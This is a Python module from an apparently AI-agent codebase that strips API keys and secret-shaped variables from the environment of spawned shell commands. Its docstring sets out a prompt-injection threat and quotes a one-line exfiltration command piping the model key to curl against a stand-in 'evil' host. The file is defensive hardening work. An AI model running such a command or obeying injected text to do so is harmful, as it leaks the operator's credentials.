"""
src/envscrub.py

specs/0078: a minimal, ALLOWLISTED environment for run_command children.

Codex confines a spawned command's environment; OAC did not. run_command spawned its child (PowerShell / bash)
with no `env=`, so the child inherited the FULL os.environ — including CODE_API_KEY (the model key) and
everything load_dotenv() pulled from .env. A prompt-injected `echo $env:CODE_API_KEY | curl evil` (or
`Get-ChildItem Env:`) then exfiltrates the key in a single line — the highest-EV hole the security review found.

child_env() builds a minimal env: a small allowlist of the vars a shell / toolchain actually needs, plus an
operator passlist (CODE_ENV_PASSLIST), with every CODE_* and secret-shaped variable dropped. Off by default
(CODE_ENV_SCRUB) -> child_env returns None and run_command inherits the env exactly as before (byte-identical).
"""
import os
import re

from . import config

# The vars a shell / common toolchain legitimately needs. Everything else is dropped.
_ALLOW = {
    "PATH", "PATHEXT", "SYSTEMROOT", "SYSTEMDRIVE", "WINDIR", "COMSPEC", "TEMP", "TMP", "TMPDIR",
    "HOME", "USERPROFILE", "HOMEDRIVE", "HOMEPATH", "USERNAME", "USER", "LOGNAME", "PWD",
    "LANG", "LC_ALL", "LC_CTYPE", "TERM", "SHELL", "TZ", "PSMODULEPATH",
    "PROCESSOR_ARCHITECTURE", "PROCESSOR_IDENTIFIER", "NUMBER_OF_PROCESSORS",
    "APPDATA", "LOCALAPPDATA", "PROGRAMFILES", "PROGRAMFILES(X86)", "PROGRAMDATA",
    "COMMONPROGRAMFILES", "COMMONPROGRAMFILES(X86)", "COMPUTERNAME",
}
# Secret-shaped variable NAMES, always dropped (defense in depth) unless explicitly passlisted.
_SECRET_NAME = re.compile(
    r"(?i)(api[_-]?key|secret|token|password|passwd|credential|bearer|session|"
    r"aws_|azure_|gcp_|google_|openai_|anthropic_|together_|tavily_|hf_|huggingface)")


def child_env(base=None):
    """The scrubbed env dict for a run_command child — or None when CODE_ENV_SCRUB is off (inherit as before,
    byte-identical). Keeps only allowlisted + CODE_ENV_PASSLIST names; drops every CODE_* and secret-shaped
    var. A passlisted name overrides the secret-name drop (the operator asked for it), but CODE_* never leaks."""
    if not config.ENV_SCRUB:
        return None
    src = os.environ if base is None else base
    passlist = {n.strip().upper() for n in (config.ENV_PASSLIST or "").split(",") if n.strip()}
    out = {}
    for k, v in src.items():
        ku = k.upper()
        if ku.startswith("CODE_"):                       # OAC's own config + the model key -> never to a child
            continue
        if not (ku in _ALLOW or ku in passlist):         # not needed by a shell/toolchain and not passlisted
            continue
        if _SECRET_NAME.search(k) and ku not in passlist:   # secret-shaped -> drop unless explicitly passlisted
            continue
        out[k] = v
    return out
